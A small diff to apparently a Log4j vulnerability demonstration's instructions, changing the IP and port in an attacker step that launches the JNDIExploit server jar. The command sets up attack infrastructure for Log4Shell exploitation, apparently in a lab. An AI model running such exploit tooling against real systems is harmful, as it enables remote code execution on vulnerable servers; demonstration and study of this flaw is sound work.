@@ -1,7 +1,7 @@
 ATTACKER:
 1. `cd Log4j/Demonstration/attacker_jndi`
 
-2. `java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.0.113 -p 8888`
+2. `java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.0.100 -p 8081`
 
 ---
 
